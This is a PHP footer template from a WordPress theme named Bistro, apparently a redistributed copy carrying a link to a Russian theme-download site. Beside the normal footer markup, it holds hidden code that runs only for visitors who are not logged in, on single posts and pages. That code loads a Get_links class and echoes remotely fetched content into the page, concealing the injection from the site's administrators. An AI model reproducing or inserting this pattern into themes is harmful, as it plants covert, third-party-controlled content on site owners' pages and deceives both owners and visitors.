<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package fabthemes
 */
?>

	</div><!-- #content -->

	<div id="footer-widgets" class="clearfix">
		<div class="container"> <div class="row"> 
			<?php dynamic_sidebar( 'footerbar' ); ?>
		</div></div>
	</div>
	
	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="container"> <div class="row"> 
			<div class="col-md-12">
				<div class="site-info">
				Copyright &copy; <?php echo date('Y');?> <a href="<?php bloginfo('url'); ?>" title="<?php bloginfo('name'); ?>"><?php bloginfo('name'); ?></a> - <?php bloginfo('description'); ?> <br>
				<?php if (is_home() || is_category() || is_archive() ){ ?><a href="http://demo.fabthemes.com/bistro" title="Bistro">Bistro</a> - <a href="http://wp-templates.ru/">Темы WordPress</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
				</div><!-- .site-info -->
			</div>
		</div></div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>

<script type="text/javascript">
	jQuery(".inhead").backstretch("<?php echo ft_of_get_option('fabthemes_header',''); ?>");
</script>

</body>
</html>
